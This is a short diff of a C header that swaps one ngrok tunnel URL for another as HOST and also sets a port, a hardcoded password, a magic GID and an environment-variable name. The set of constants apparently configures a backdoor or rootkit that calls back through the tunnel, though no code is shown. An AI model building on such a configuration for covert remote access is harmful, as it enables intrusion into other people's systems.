@@ -7,8 +7,8 @@
 #define ENVIRONMENT_VAR "SEPA"
 // #define VERBOSE
 #define __i386__
-#define HOST "https://3d72-2a02-b021-8011-8ba7-7d35-997f-93c2-4a3e.ngrok-free.app"
+#define HOST "https://2468-2a02-b027-11-e5d7-20ad-6cba-ff7f-781c.ngrok-free.app"
 #define PORT 4543
 #define BUFFER_SIZE 1024
-#define PASSWORD "password" "\n"
+#define PASSWORD "password\n"
 #define GID 5435
